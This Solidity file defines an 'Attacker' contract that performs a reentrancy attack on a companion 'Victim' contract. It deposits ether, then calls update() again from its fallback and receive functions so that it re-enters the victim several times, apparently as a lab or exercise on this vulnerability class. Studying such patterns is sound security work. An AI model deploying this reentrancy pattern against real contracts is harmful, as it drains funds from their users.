// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "./Victim.sol";

contract Attacker{
    Victim public victim = Victim(address(0));
    uint i;

    fallback() external payable{
        i += 1;
        if(i<5){
            victim.update();
        }
    }

    receive() external payable{
        victim.update();
    }

    constructor(address _victim) payable{
        victim = Victim(address(_victim));
    }

    function deposit() public{
        victim.deposit{value: 1 ether}();
    }

    function attack() public{
        victim.update();
    }

}